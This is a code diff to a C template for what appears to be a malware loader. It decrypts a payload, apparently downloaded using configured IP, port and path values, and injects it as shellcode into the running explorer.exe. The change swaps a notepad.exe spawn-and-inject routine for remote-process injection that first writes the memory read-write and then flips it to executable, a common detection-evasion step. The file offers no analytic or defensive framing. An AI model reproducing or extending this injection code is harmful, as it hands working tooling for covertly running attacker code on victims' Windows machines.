@@ -13,7 +13,7 @@
 // Forward declarations
 int DL();
 void decrypt_payload(unsigned char *data, size_t data_len);
-void inject_into_process(unsigned char *sc, size_t sc_size);
+int PI(unsigned char *sc, size_t sc_size);
 
 unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
 size_t payload_len = {{PAYLOAD_SIZE}};
@@ -27,6 +27,7 @@ wchar_t PROTOCOL[10];
 wchar_t IP[50];
 short PORT;
 wchar_t PATH[100];
+char PROCESS[50] = "explorer.exe";
 
 unsigned char *{{BUF_NAME}} = NULL;
 size_t {{SIZE_NAME}} = 0;
@@ -141,27 +142,41 @@ int DL() {
     return 1;
 }
 
-void inject_into_process(unsigned char *sc, size_t sc_size) {
-    STARTUPINFOA si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    si.cb = sizeof(si);
+int PI(unsigned char *sc, size_t sc_size) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;
 
-    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
-        return;
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+    DWORD pid = 0;
+    HANDLE hProcess = NULL;
 
-    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remote_mem) { TerminateProcess(pi.hProcess, 1); return; }
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            if (_stricmp(PROCESS, pe.szExeFile) == 0) {
+                pid = pe.th32ProcessID;
+                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+                if (hProcess) break;
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    if (!hProcess) return -1;
 
-    if (!WriteProcessMemory(pi.hProcess, remote_mem, sc, sc_size, NULL)) { TerminateProcess(pi.hProcess, 1); return; }
+    LPVOID alloc = VirtualAllocEx(hProcess, NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!alloc) { CloseHandle(hProcess); return -1; }
 
-    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
-    if (!hThread) { TerminateProcess(pi.hProcess, 1); return; }
+    if (!WriteProcessMemory(hProcess, alloc, sc, sc_size, NULL)) { CloseHandle(hProcess); return -1; }
 
-    ResumeThread(pi.hThread);
+    DWORD oldProtect = 0;
+    if (!VirtualProtectEx(hProcess, alloc, sc_size, PAGE_EXECUTE_READWRITE, &oldProtect)) { CloseHandle(hProcess); return -1; }
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
+    if (!hThread) { CloseHandle(hProcess); return -1; }
 
     CloseHandle(hThread);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    CloseHandle(hProcess);
+    return 0;
 }
 
 int main() {
@@ -187,7 +202,7 @@ int main() {
     decrypt_payload(final_payload, final_size);
 
     if (!strcmp(payload_type, "shellcode")) {
-        inject_into_process(final_payload, final_size);
+        PI(final_payload, final_size);
     }
 
     return 0;
